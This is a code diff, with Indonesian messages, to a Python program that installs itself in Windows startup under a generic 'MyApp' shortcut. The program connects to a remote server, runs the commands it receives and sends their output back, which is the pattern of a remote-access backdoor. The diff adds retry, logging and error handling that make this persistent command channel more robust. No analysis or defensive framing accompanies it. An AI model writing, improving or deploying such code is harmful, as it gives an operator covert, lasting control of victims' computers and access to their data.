@@ -31,9 +31,10 @@ def connect_with_retry(host, port, retries=5, delay=5):
             server = Server.ConnectServer(host, port)
             return server
         except Exception as e:
+            print(f"[Error] Gagal menghubungkan ke server di {host}:{port}, percobaan ke-{attempt + 1}: {e}")
             time.sleep(delay)
-            continue
-    raise ConnectionError(f"Gagal menghubungkan ke server di {host}:{port} setelah {retries} percobaan.")
+    print(f"[Error] Gagal menghubungkan ke server di {host}:{port} setelah {retries} percobaan.")
+    return None
 
 # Fungsi untuk menambahkan aplikasi ke startup Windows
 def add_to_startup(file_path=None, shortcut_name='MyApp'):
@@ -56,15 +57,26 @@ def add_to_startup(file_path=None, shortcut_name='MyApp'):
             shortcut.save()
             print(f"Shortcut dibuat: {shortcut_path}")
         except Exception as e:
-            print(f"Gagal membuat shortcut: {e}")
+            print(f"[Error] Gagal membuat shortcut: {e}")
 
 # Eksekusi utama dimulai di sini
 if __name__ == '__main__':
     # Menambahkan ke startup pada saat pertama kali dijalankan atau sesuai kebutuhan
-    add_to_startup()
+    try:
+        add_to_startup()
+    except Exception as e:
+        print(f"[Error] Gagal menambahkan aplikasi ke startup: {e}")
 
     # Menghubungkan ke server dengan logika pengulangan
-    server = connect_with_retry(SERVER_HOST, SERVER_PORT)
+    server = None
+    try:
+        server = connect_with_retry(SERVER_HOST, SERVER_PORT)
+        if server is None:
+            print("[Error] Tidak dapat terhubung ke server. Aplikasi akan berhenti.")
+            sys.exit(1)
+    except Exception as e:
+        print(f"[Error] Kesalahan saat menghubungkan ke server: {e}")
+        sys.exit(1)
 
     command = ""
     while command.lower() != "exit":
@@ -76,8 +88,11 @@ if __name__ == '__main__':
             # Mengirimkan respons perintah
             server.Send(output)
         except Exception as e:
-            # Menangani kesalahan potensial selama komunikasi
+            print(f"[Error] Kesalahan selama komunikasi: {e}")
             continue
 
     # Menutup koneksi
-    server.Disconnect()
+    try:
+        server.Disconnect()
+    except Exception as e:
+        print(f"[Error] Gagal menutup koneksi: {e}")
